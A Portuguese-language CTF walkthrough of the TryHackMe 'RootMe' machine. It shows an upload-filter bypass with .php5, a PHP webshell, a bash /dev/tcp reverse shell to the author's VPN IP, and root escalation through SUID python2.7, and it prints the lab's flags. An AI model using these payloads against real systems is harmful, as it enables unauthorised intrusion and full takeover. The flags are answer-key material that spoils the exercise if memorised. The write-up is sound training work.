# RootMe - TryHackMe - Walkthrough

Resolvi essa máquina num domingo à noite, então anotando aqui de cabeça ainda fresca pra não esquecer depois.

## Começando - VPN e alvo

Primeiro conectei a VPN da THM e confirmei que peguei IP:

```bash
ip a show tun0
# inet 192.168.129.84/18
```

Anotei esse IP porque ia precisar pro reverse shell depois. O alvo era `10.67.188.203`, dei um ping só pra ver se tava vivo:

```bash
ping -c1 10.67.188.203
# 64 bytes... ttl=62
```

Tava no ar.

## Enumeração

Rodei o nmap básico de sempre:

```bash
nmap -sC -sV -oN nmap-initial.txt 10.67.188.203
```

Voltou só duas portas:
- 22 ssh OpenSSH 8.2p1
- 80 http Apache 2.4.41

Abri no navegador, página besta "HackIT - Home" com "Can you root me?". Cara, toda hora é isso.

Fui pro gobuster. Errei o comando umas duas vezes (esqueci o path da wordlist no meu Kali), no fim foi:

```bash
gobuster dir -u http://10.67.188.203/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Achou na hora:
```
/panel (301)
/uploads (301)
/css, /js, /index.php
```

`/panel/` era um form de upload. `/uploads/` tava vazio mas com listing aberto, então dava pra ver o que eu subia.

## O upload e a dor de cabeça com extensão

Tentei subir um `test.php` com `<?php echo "pwned"; ?>` e tomou block:

> PHP não é permitido!

Já imaginava que era blacklist de extensão. Fui testando na mão mesmo:

```bash
for ext in php5 phtml php4 phar php3 php7 pht; do
  echo '<?php echo "pwned"; ?>' > /tmp/test.$ext
  curl -s -F "fileUpload=@/tmp/test.$ext" -F "submit=Upload" http://10.67.188.203/panel/ | grep -i sucesso
done
```

Todos deram "sucesso", então o filtro só barrava `.php` exato. Mas aí vem o pulo: subir não quer dizer executar. Testei acessando cada um:

```bash
curl -s http://10.67.188.203/uploads/test.php5  # voltou: pwned -> executou
curl -s http://10.67.188.203/uploads/test.phtml # pwned -> executou
curl -s http://10.67.188.203/uploads/test.php4  # voltou o código fonte -> não executa
```

Eu tinha baixado um `php-reverse-shell.php4` pronto e fiquei um tempão tentando entender porque não voltava shell. Era isso. `.php4` subia mas o Apache servia como texto, não passava pelo PHP. Perdi uns 20 min nisso, confesso.

Moral: nessa máquina tem que usar `.php5` (ou `.phtml`).

## Pegando RCE

Desisti do reverse shell gigante e fui de webshell simples pra testar:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php5
curl -F "fileUpload=@shell.php5" -F "submit=Upload" http://10.67.188.203/panel/
curl "http://10.67.188.203/uploads/shell.php5?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

Quando vi `www-data` até comemorei sozinho aqui. Tava dentro.

Dali pra frente usei o webshell pra tudo:

```bash
curl -G http://10.67.188.203/uploads/shell.php5 --data-urlencode "cmd=whoami;pwd;ls -la"
# www-data
# /var/www/html/uploads
```

## Primeira flag

Procurei flag de usuário:

```bash
curl -G http://10.67.188.203/uploads/shell.php5 --data-urlencode "cmd=ls -la /var/www/; cat /var/www/user.txt"
```

Tava em `/var/www/user.txt` e não na home como eu achei que ia ser:

```
THM{y0u_g0t_a_sh3ll}
```

## Privesc - o python com SUID

Comando clássico:

```bash
curl -G http://10.67.188.203/uploads/shell.php5 --data-urlencode "cmd=find / -perm -u=s -type f 2>/dev/null"
```

Veio uma lista enorme, quase tudo normal (`sudo`, `passwd`, `su`, `mount`...), mas um destoava total:

```
/usr/bin/python2.7
```

Fui confirmar:

```bash
curl -G ... --data-urlencode "cmd=ls -l /usr/bin/python*"
# -rwsr-xr-x 1 root root /usr/bin/python2.7
```

Aquele `s` ali (`rws`) é SUID root. Python com SUID é presente de grego, porque ele deixa você rodar qualquer coisa como root.

Testei direto pelo webshell sem precisar de shell interativo:

```bash
curl -G http://10.67.188.203/uploads/shell.php5 --data-urlencode "cmd=/usr/bin/python2.7 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\",\"-c\",\"id; cat /root/root.txt\")'"
```

Retornou:

```
uid=33(www-data) gid=33(www-data) euid=0(root)
THM{pr1v1l3g3_3sc4l4t10n}
```

Root pego. Pra quem quiser fazer bonitinho com shell interativo, depois eu fiz também com listener:

Terminal 1:
```bash
nc -lvnp 4444
```

Arquivo `rev.php5`:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.84/4444 0>&1'"); ?>
```

Upei e acessei, caiu o reverse. Aí estabilizei com `python3 -c 'import pty; pty.spawn("/bin/bash")'` e escalei com:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'
cat /root/root.txt
```

## Resumo das flags

- user: `THM{y0u_g0t_a_sh3ll}` em `/var/www/user.txt`
- root: `THM{pr1v1l3g3_3sc4l4t10n}` em `/root/root.txt`

## O que eu aprendi / errei

1. Não confiar em shell pronto sem olhar, meu `.php4` veio quebrado e ainda com extensão errada.
2. Subiu != executou. Sempre testar com `echo pwned` antes do reverse.
3. SUID em linguagem de script (python, ruby, etc) é quase sempre o caminho de privesc nessas máquinas fáceis.

É isso, máquina boa pra treinar básico de upload bypass + SUID.
